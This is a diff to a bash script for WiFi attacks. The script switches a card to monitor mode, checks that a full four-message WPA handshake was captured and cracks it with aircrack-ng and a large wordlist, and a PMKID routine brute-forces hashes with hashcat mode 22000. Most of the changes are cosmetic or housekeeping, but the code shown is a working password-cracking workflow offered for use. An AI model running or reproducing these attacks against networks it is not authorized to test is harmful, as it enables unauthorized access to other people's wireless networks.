@@ -19,18 +19,18 @@ nc='\033[0m' # No Color
 echo ""
 
 function exit_script() {
-    echo -e "\n${red}[-]${nc} Taking network card to monitor mode..."
+    echo -e "\n${green}[-]${nc} Taking network card to monitor mode..."
     sleep 0.5
     airmon-ng stop ${network_card} &>/dev/null
     echo -e "${green}[+]${nc} Network card is now in managed mode."
     # restart network manager
-    echo -e "\n${red}[-]${nc} Restarting network manager..."
+    echo -e "\n${green}[-]${nc} Restarting network manager..."
     sleep 0.5
     service network-manager restart &>/dev/null
     service NetworkManager restart &>/dev/null
     service wpa_supplicant restart &>/dev/null
     echo -e "${green}[+]${nc} Network manager restarted."
-    echo -e "\n${red}[-]${nc} Exiting..."
+    echo -e "\n${green}[-]${nc} Exiting..."
     tput cnorm; exit 0
 }
 
@@ -67,7 +67,7 @@ function check_installer_manager(){
 }
 
 function install_hcxdumptool(){
-    echo -e "${red}[-]${nc} Installing hcxdumptool..."
+    echo -e "${green}[-]${nc} Installing hcxdumptool..."
     sleep 0.5
     if [[ $installer == "apt" ]]; then
         apt install -y libcurl4-openssl-dev libssl-dev pkg-config &>/dev/null
@@ -167,11 +167,21 @@ function handshake(){
         fi
     fi
 
-    # rm -rf handshake.txt
-    mkdir -p handshakes
-    mv capture_* handshakes/
+    if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) == "1" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) == "1" ]]; then
+        mkdir -p handshakes
+        mv capture_* handshakes/
 
-    xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+        xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+        aircrack_xterm_pid=$!
+        echo -e "\n${yellow}[*]${nc} Cracking handshake..."
+        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
+        echo -e "${yellow}[!]${nc} sudo kill -9 $aircrack_xterm_pid"
+    else
+        echo -e "${red}[-]${nc} The failed captures will be deleted"
+        rm -rf capture_*
+    fi
+
+    rm -rf handshake.txt
 
 }
 
@@ -198,10 +208,13 @@ function pmkid(){
         echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
         sleep 1
         xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt" &
+        hashcat_xterm_pid=$!
+        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you finished"
+        echo -e "${yellow}[!]${nc} sudo kill -9 $hashcat_xterm_pid"
     else
         echo -e "\n${red}[!]${nc} The hashes are not captured :("
 
-        echo -ne "\n${purple}[?]${nc} Retry? (y/n): "; read option
+        echo -ne "\n${purple}[?]${nc} Do you want to retry? (y/n): "; read option
 
         if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
             echo -e "\n${yellow}[R]${nc} Retrying...\n"
